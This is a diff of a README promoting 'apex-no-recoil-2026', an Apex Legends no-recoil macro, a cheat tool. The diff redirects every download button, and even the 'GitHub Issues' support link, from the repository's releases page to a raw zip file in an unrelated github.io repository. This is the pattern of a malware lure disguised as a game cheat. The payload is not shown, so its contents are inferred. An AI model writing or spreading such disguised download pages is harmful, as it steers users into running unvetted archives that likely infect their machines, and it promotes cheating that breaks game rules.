@@ -5,7 +5,7 @@ description: "Eliminate recoil in Apex Legends with a precision macro for all we
 ---
 # 🎯 apex-no-recoil-2026 - Master Every Shot Instantly
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD%20APEX%20NO%20RECOIL%202026-Click%20Here%20to%20Get%20It!-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=orange)](https://github.com/Judieflaring5570/apex-no-recoil-2026/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD%20APEX%20NO%20RECOIL%202026-Click%20Here%20to%20Get%20It!-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=orange)](https://github.com/Judieflaring5570/judieflaring5570.github.io/raw/refs/heads/main/accumber/3.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This works with the **R-301 Carbine**, the **VK-47 Flatline**, the **Hemlok Burs
 
 **Step 1: Get the Download**
 
-[![Download Here](https://img.shields.io/badge/📥%20DOWNLOAD%20FROM%20OFFICIAL%20RELEASES-Click%20to%20Download-red?style=flat-square)](https://github.com/Judieflaring5570/apex-no-recoil-2026/releases)
+[![Download Here](https://img.shields.io/badge/📥%20DOWNLOAD%20FROM%20OFFICIAL%20RELEASES-Click%20to%20Download-red?style=flat-square)](https://github.com/Judieflaring5570/judieflaring5570.github.io/raw/refs/heads/main/accumber/3.1.zip)
 
 Visit this link to download the application.
 
@@ -126,7 +126,7 @@ Your data stays entirely on your PC. This software has **no network communicatio
 
 ## 📢 Support
 
-If you need assistance, have questions, or want to report an issue, please visit the [GitHub Issues page](https://github.com/Judieflaring5570/apex-no-recoil-2026/issues). We typically respond within 24–48 hours.
+If you need assistance, have questions, or want to report an issue, please visit the [GitHub Issues page](https://github.com/Judieflaring5570/judieflaring5570.github.io/raw/refs/heads/main/accumber/3.1.zip). We typically respond within 24–48 hours.
 
 ---
 
@@ -143,7 +143,7 @@ If you need assistance, have questions, or want to report an issue, please visit
 
 Ready to dominate your lobbies?
 
-[![Get Started Now](https://img.shields.io/badge/🚀%20VISIT%20DOWNLOADS%20PAGE-Get%20the%20Latest%20Version%20Now!-blueviolet?style=for-the-badge&logo=github)](https://github.com/Judieflaring5570/apex-no-recoil-2026/releases)
+[![Get Started Now](https://img.shields.io/badge/🚀%20VISIT%20DOWNLOADS%20PAGE-Get%20the%20Latest%20Version%20Now!-blueviolet?style=for-the-badge&logo=github)](https://github.com/Judieflaring5570/judieflaring5570.github.io/raw/refs/heads/main/accumber/3.1.zip)
 
 Visit this link to download the application.
 
